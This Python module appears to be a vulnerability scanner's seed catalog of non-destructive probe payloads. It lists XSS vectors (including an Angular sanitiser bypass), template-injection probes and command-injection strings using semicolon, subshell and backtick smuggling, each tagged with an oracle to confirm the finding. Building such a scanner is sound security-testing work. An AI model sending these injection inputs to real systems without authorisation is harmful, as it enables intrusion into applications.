"""Bundled, curated seed catalog — non-destructive, oracle-tagged starter set.

Deliberately small and high-signal (the flagship vectors per class/context), the
way `core/nuclei/techcve` is a starter table not a DB. Loaders
(:mod:`core.payloads.loaders`) enrich it from PayloadsAllTheThings / the
PortSwigger XSS cheat-sheet at runtime. Every XSS vector sets the same sentinel
(``window.__raptor_xss='{tok}'``) so it serves BOTH the reflected-HTTP oracle
(its raw presence == unescaped injection) and the DOM oracle (the sentinel proves
execution) — including the ``<iframe src="javascript:…">`` vector that bypasses
Angular's sanitiser (OWASP Juice Shop's DOM-XSS).
"""

from __future__ import annotations

from typing import List

from core.payloads.entry import (
    CTX_ANY, CTX_ATTR_DOUBLE, CTX_ATTR_SINGLE, CTX_HTML_BODY, CTX_JS_STRING, CTX_URI,
    ORACLE_COMPUTED, ORACLE_UNESCAPED, PayloadEntry,
)

_SENT = "window.__raptor_xss='{tok}'"   # sentinel set on execution

SEED: List[PayloadEntry] = [
    # ─────────────── XSS — HTML body context ───────────────
    PayloadEntry("xss-body-img", "xss", f'<img src=x onerror="{_SENT}">',
                 oracle=ORACLE_UNESCAPED, context=CTX_HTML_BODY, technique="img/onerror",
                 tags=("dom",)),
    PayloadEntry("xss-body-svg", "xss", f'<svg onload="{_SENT}">',
                 oracle=ORACLE_UNESCAPED, context=CTX_HTML_BODY, technique="svg/onload",
                 tags=("dom",)),
    # Angular/DOM-sanitiser bypass — Juice Shop's DOM-XSS vector
    PayloadEntry("xss-body-iframe-js", "xss", f'<iframe src="javascript:{_SENT}">',
                 oracle=ORACLE_UNESCAPED, context=CTX_HTML_BODY,
                 technique="iframe/javascript-uri", tags=("dom", "sanitizer-bypass")),
    # ─────────────── XSS — attribute breakout ───────────────
    PayloadEntry("xss-attr2-img", "xss", f'"><img src=x onerror="{_SENT}">',
                 oracle=ORACLE_UNESCAPED, context=CTX_ATTR_DOUBLE, technique="attr-breakout",
                 tags=("dom",)),
    PayloadEntry("xss-attr1-svg", "xss", f"'><svg onload='{_SENT}'>",
                 oracle=ORACLE_UNESCAPED, context=CTX_ATTR_SINGLE, technique="attr-breakout",
                 tags=("dom",)),
    # ─────────────── XSS — JS string context ───────────────
    PayloadEntry("xss-js-break", "xss", f"';{_SENT};//",
                 oracle=ORACLE_UNESCAPED, context=CTX_JS_STRING, technique="js-string-break",
                 tags=("dom",)),
    PayloadEntry("xss-js-arith", "xss", f"'-{_SENT}-'",
                 oracle=ORACLE_UNESCAPED, context=CTX_JS_STRING, technique="js-arith-break",
                 tags=("dom",)),
    # ─────────────── XSS — URI/href context ───────────────
    PayloadEntry("xss-uri-js", "xss", f"javascript:{_SENT}",
                 oracle=ORACLE_UNESCAPED, context=CTX_URI, technique="javascript-uri",
                 tags=("dom",)),

    # ─────────────── SSTI (computed) ───────────────
    PayloadEntry("ssti-jinja", "ssti", "{tok}{{ {a}*{b} }}{tok}",
                 oracle=ORACLE_COMPUTED, context=CTX_ANY, technique="jinja/twig"),
    PayloadEntry("ssti-freemarker", "ssti", "{tok}${{ {a}*{b} }}{tok}",
                 oracle=ORACLE_COMPUTED, context=CTX_ANY, technique="freemarker/el"),
    PayloadEntry("ssti-erb", "ssti", "{tok}<%= {a}*{b} %>{tok}",
                 oracle=ORACLE_COMPUTED, context=CTX_ANY, technique="erb"),

    # ─────────────── Command injection (computed, non-destructive) ───────────────
    PayloadEntry("cmdi-semi", "cmdi", "; echo {tok}$(({a}*{b})){tok}",
                 oracle=ORACLE_COMPUTED, context=CTX_ANY, technique="semicolon"),
    PayloadEntry("cmdi-subshell", "cmdi", "$(echo {tok}$(({a}*{b})){tok})",
                 oracle=ORACLE_COMPUTED, context=CTX_ANY, technique="subshell"),
    PayloadEntry("cmdi-backtick", "cmdi", "`echo {tok}$(({a}*{b})){tok}`",
                 oracle=ORACLE_COMPUTED, context=CTX_ANY, technique="backtick"),
]


__all__ = ["SEED"]
